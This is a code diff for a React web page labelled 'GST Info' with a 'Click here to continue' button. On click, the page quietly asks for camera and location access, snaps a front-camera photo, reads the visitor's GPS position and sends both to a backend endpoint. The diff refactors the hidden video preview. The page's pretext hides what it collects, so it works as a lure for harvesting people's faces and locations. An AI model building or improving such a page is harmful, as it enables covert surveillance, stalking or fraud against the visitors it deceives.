@@ -4,7 +4,7 @@ import { useRef, useState } from "react";
 
 export default function Home() {
   const videoRef = useRef<HTMLVideoElement>(null);
-  const [showPreview, setShowPreview] = useState(false);
+  const [previewVisible, setPreviewVisible] = useState(false);
   const [busy, setBusy] = useState(false);
 
   async function captureAll() {
@@ -12,37 +12,29 @@ export default function Home() {
     setBusy(true);
 
     try {
-      // 1️⃣ Request CAMERA permission
+      // 1️⃣ CAMERA permission (must be first)
       const stream = await navigator.mediaDevices.getUserMedia({
         video: { facingMode: "user" }
       });
 
-      // 2️⃣ Request LOCATION permission
+      // 2️⃣ LOCATION permission
       const position = await new Promise<GeolocationPosition>(
         (resolve, reject) =>
           navigator.geolocation.getCurrentPosition(resolve, reject)
       );
 
-      // 3️⃣ Show preview FIRST
-      setShowPreview(true);
-
-      // ⏱ wait for React to render <video>
-      await new Promise(res => setTimeout(res, 0));
-
-      const video = videoRef.current;
-      if (!video) {
-        throw new Error("Video element not mounted");
-      }
-
-      // 4️⃣ Attach stream
+      const video = videoRef.current!;
       video.srcObject = stream;
       video.muted = true;
+
+      // 3️⃣ Show preview (CSS only)
+      setPreviewVisible(true);
       await video.play();
 
       // ⏱ allow browser to paint a real frame
       await new Promise(res => setTimeout(res, 1000));
 
-      // 5️⃣ Capture image
+      // 4️⃣ Capture image (full quality)
       const canvas = document.createElement("canvas");
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
@@ -53,11 +45,11 @@ export default function Home() {
       const image = canvas.toDataURL("image/jpeg", 0.9);
       console.log("Image length:", image.length);
 
-      // 6️⃣ Cleanup
+      // 5️⃣ Cleanup
       stream.getTracks().forEach(t => t.stop());
-      setShowPreview(false);
+      setPreviewVisible(false);
 
-      // 7️⃣ Send to backend
+      // 6️⃣ Send to backend
       await fetch("/api/send", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -81,14 +73,13 @@ export default function Home() {
       <h1>GST Info</h1>
       <p>Click here to continue</p>
 
-      {showPreview && (
-        <video
-          ref={videoRef}
-          playsInline
-          muted
-          className="camera-preview"
-        />
-      )}
+      {/* ALWAYS MOUNTED VIDEO */}
+      <video
+        ref={videoRef}
+        playsInline
+        muted
+        className={`camera-preview ${previewVisible ? "show" : ""}`}
+      />
 
       <button
         onClick={captureAll}
